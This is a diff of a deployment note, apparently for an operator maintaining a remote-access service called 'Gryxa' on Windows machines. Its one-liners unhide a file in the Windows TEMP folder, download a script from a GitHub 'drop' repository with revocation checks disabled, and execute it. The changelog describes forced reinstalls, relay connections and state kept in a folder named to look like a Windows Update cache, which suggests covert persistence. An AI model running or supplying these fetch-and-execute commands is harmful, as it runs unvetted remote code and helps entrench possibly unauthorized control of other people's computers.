@@ -1,15 +1,13 @@
-UNIVERSAL DEPLOY (O38 / M28 / L15 — Gryxa 8h deep health):
+UNIVERSAL DEPLOY (O39 / M29 / L16 — stop Gryxa panel duplicates):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o38" & findstr /C:"OWN BUILD 20260802O38" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o39" & findstr /C:"OWN BUILD 20260802O39" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-SHA-pin (if main raw lags):
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/5fa263a80f16a7aa2798f0f626ed9bcfbd8c874a/own.txt" & findstr /C:"OWN BUILD 20260802O38" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+SHA-pin:
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/SHA/own.txt" & findstr /C:"OWN BUILD 20260802O39" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-O38 Gryxa health:
-- Every mon tick: light ensure (service Running + dir).
-- Every 8 hours (gryxa_deep.flag): download fresh MSI from ui.gryxa.com,
-  detect fingerprint drift (server/keys change), TCP to update.gryxa.com
-  AND/OR ui.gryxa.com:443, relay config, then /x+/i reinstall until HEALTHY.
-- Current FP stored in .wucache\gryxa.cfg (exterminate/secure/tg follow it).
-
-Expect: Source O38 | MON=M28 | LIB=L15 | TGR=T16 | SEC=S9
+O39 fix (duplicates):
+- HARD RULE: if Gryxa service is Running → never msiexec /x or /i.
+- TCP/relay blips are advisory only (no longer trigger reinstall).
+- findstr /B HEALTHY (UNHEALTHY no longer matches HEALTHY).
+- Reinstall only when: not Running, OR true MSI fingerprint drift, OR Force.
+- Reinstall rate-limit 12h. Deep 8h still checks FP drift without churn.
